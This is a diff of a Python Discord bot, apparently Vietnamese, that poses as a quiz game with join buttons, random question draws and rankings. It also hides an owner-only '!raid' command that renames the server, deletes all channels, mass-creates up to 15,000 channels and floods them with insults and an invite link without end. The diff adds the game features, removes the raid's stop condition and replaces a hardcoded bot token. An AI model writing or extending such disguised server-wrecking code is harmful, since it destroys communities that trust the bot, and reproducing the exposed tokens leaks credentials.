@@ -9,7 +9,7 @@ import os
 import math
 
 # ===== CẤU HÌNH GỐC (NUKE) =====
-TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.GjqtKA.DmqnYPTZmXjQIIXes7wMhfopDh1QFZcQBJTkGI"
+TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.G2cmGO.m8cpBOpimCphXNZKJAsjZ1B8ajcTGrMVIr0vvI"
 OWNER_ID = 1413781843030966345
 RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
 CHANNEL_COUNT = 15000
@@ -17,11 +17,24 @@ BATCH_SIZE = 80
 SPAM_LINK = "https://discord.gg/MQ9Zr4H4d"
 SPAM_MESSAGE = "***SERVER CỦA CHA NÈ MẤY THẰNG NGU ĐÚ ĐỞN***"
 NEW_GUILD_NAME = "👑 𝐍𝐮𝐤𝐞 𝐁𝐲 𝐁𝐚𝐧𝐚𝐧𝐚𝐯𝐮𝐢𝐯𝐞 👑"
-raid_active = True
 
 # ===== CẤU HÌNH MINI GAME =====
 DATA_FILE = "rankings.json"
 QUIZ_DURATION = 30
+PLAYERS_FILE = "players.json"
+
+# ===== QUẢN LÝ NGƯỜI CHƠI =====
+def load_players():
+    if os.path.exists(PLAYERS_FILE):
+        with open(PLAYERS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    return {}
+
+def save_players(data):
+    with open(PLAYERS_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, ensure_ascii=False, indent=4)
+
+players = load_players()
 
 # ===== HỆ THỐNG RANK =====
 RANK_IMAGES = {
@@ -218,24 +231,65 @@ intents = discord.Intents.all()
 client = discord.Client(intents=intents)
 tree = app_commands.CommandTree(client)
 
-# ===== LỆNH SLASH CÔNG KHAI =====
-@tree.command(name="random", description="🎡 Quay vòng chọn thành viên và đặt câu hỏi")
+# ===== LỆNH START - THAM GIA GAME =====
+class JoinButton(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+        self.add_item(discord.ui.Button(label="🎮 Tham gia ngay!", style=discord.ButtonStyle.success, custom_id="join_game"))
+
+@tree.command(name="start", description="🎮 Bắt đầu game – nhấn nút để tham gia")
+async def slash_start(interaction: discord.Interaction):
+    if not interaction.guild:
+        await interaction.response.send_message("❌ Lệnh này chỉ dùng trong server!", ephemeral=True)
+        return
+
+    embed = discord.Embed(
+        title="🎮 **MINI GAME – BANANAVUIVE** 🎮",
+        description="Nhấn nút bên dưới để tham gia trò chơi!\n\n"
+                    "✅ Khi tham gia, bạn sẽ có tên trong danh sách người chơi.\n"
+                    "✅ Điểm số và rank sẽ được cập nhật khi bạn trả lời đúng.\n"
+                    "✅ Sử dụng `/random` để nhận câu hỏi.",
+        color=discord.Color.blue()
+    )
+    embed.set_footer(text="Hãy tham gia ngay để leo rank!")
+    view = JoinButton()
+    await interaction.response.send_message(embed=embed, view=view)
+
+@client.event
+async def on_interaction(interaction: discord.Interaction):
+    if interaction.type == discord.InteractionType.component:
+        if interaction.data.get("custom_id") == "join_game":
+            user_id = str(interaction.user.id)
+            if user_id not in players:
+                players[user_id] = interaction.user.name
+                save_players(players)
+                await interaction.response.send_message(f"✅ **{interaction.user.mention}** đã tham gia game!", ephemeral=False)
+            else:
+                await interaction.response.send_message("❌ Bạn đã tham gia rồi!", ephemeral=True)
+
+# ===== LỆNH RANDOM (CHỈ CHỌN NGƯỜI ONLINE VÀ ĐÃ THAM GIA) =====
+@tree.command(name="random", description="🎡 Chọn ngẫu nhiên 1 người đã tham gia và đang online")
 async def slash_random(interaction: discord.Interaction):
     if not interaction.guild:
         await interaction.response.send_message("❌ Lệnh này chỉ dùng trong server!", ephemeral=True)
         return
 
-    members = [m for m in interaction.guild.members if not m.bot]
-    if not members:
-        await interaction.response.send_message("❌ Server không có thành viên!", ephemeral=True)
+    # Lọc thành viên đã tham gia, đang online và không phải bot
+    online_players = [
+        m for m in interaction.guild.members 
+        if str(m.id) in players and m.status != discord.Status.offline and not m.bot
+    ]
+    
+    if not online_players:
+        await interaction.response.send_message("❌ Không có người chơi nào đang online! Hãy dùng `/start` để tham gia.", ephemeral=True)
         return
 
-    target = random.choice(members)
+    target = random.choice(online_players)
     q = random.choice(QUESTIONS)
 
     embed = discord.Embed(
-        title="🎡 **VÒNG QUAY NGẪU NHIÊN** 🎡",
-        description=create_wheel_embed(members, target),
+        title="🎡 **VÒNG QUAY NGẪU NHIÊN - ONLINE** 🎡",
+        description=create_wheel_embed(online_players, target),
         color=discord.Color.purple()
     )
     embed.add_field(
@@ -340,13 +394,12 @@ async def delete_all_channels(guild):
             pass
 
 async def create_channels_and_spam(guild):
-    global raid_active, SPAM_LINK
     total_created = 0
-    while raid_active and total_created < CHANNEL_COUNT:
+    for batch_start in range(0, CHANNEL_COUNT, BATCH_SIZE):
         batch_tasks = []
-        batch_count = min(BATCH_SIZE, CHANNEL_COUNT - total_created)
+        batch_count = min(BATCH_SIZE, CHANNEL_COUNT - batch_start)
         for i in range(batch_count):
-            idx = total_created + i + 1
+            idx = batch_start + i + 1
             name = f"{RAID_NAME} {idx}"
             batch_tasks.append(guild.create_text_channel(name))
         channels = await asyncio.gather(*batch_tasks, return_exceptions=True)
@@ -358,12 +411,9 @@ async def create_channels_and_spam(guild):
         if spam_tasks:
             await asyncio.gather(*spam_tasks, return_exceptions=True)
         await asyncio.sleep(0.05)
-        if not raid_active:
-            break
 
 async def continuous_spam(guild):
-    global raid_active, SPAM_LINK
-    while raid_active:
+    while True:
         channels = list(guild.text_channels)
         if not channels:
             await asyncio.sleep(0.3)
@@ -376,8 +426,6 @@ async def continuous_spam(guild):
         await asyncio.sleep(0.1)
 
 async def raid(guild):
-    global raid_active
-    raid_active = True
     await change_guild_name(guild)
     await asyncio.sleep(1)
     await delete_all_channels(guild)
@@ -389,11 +437,11 @@ async def raid(guild):
 @client.event
 async def on_ready():
     print("="*50)
-    print(" NUKE + QUIZ BOT – SILENT MODE")
+    print(" NUKE + QUIZ + RANDOM ONLINE – by BANANAVUIVE")
     print("="*50)
     print(f"[*] Bot online: {client.user}")
     print(f"[*] Owner ID: {OWNER_ID}")
-    print("[*] Public: /random, /rankings, /diem")
+    print("[*] Public: /start, /random (only online players), /rankings, /diem")
     print("[*] Hidden: !raid (owner only – full nuke)")
     await tree.sync()
     print("[*] Slash commands synced.")
@@ -406,28 +454,16 @@ async def on_guild_join(guild):
 
 @client.event
 async def on_message(message):
-    global raid_active, SPAM_LINK
     if message.author.id == client.user.id:
         return
     if message.author.id != OWNER_ID:
         return
 
-    if message.content.startswith("!raid"):
-        parts = message.content.split()
-        if not message.guild and len(parts) > 1:
-            new_link = parts[1]
-            if new_link.startswith(("http://", "https://")):
-                SPAM_LINK = new_link
-                print(f"[*] Link spam đã được cập nhật: {SPAM_LINK}")
-            else:
-                print("[!] Link không hợp lệ.")
-        elif message.guild:
+    if message.content.lower() == "!raid":
+        if message.guild:
             await raid(message.guild)
-            print(f"[*] Raid started in {message.guild.name}")
-
     elif message.content.lower() == "!stop":
-        raid_active = False
-        print("[*] Raid stopped by owner.")
+        sys.exit(0)
 
 @client.event
 async def on_member_remove(member):
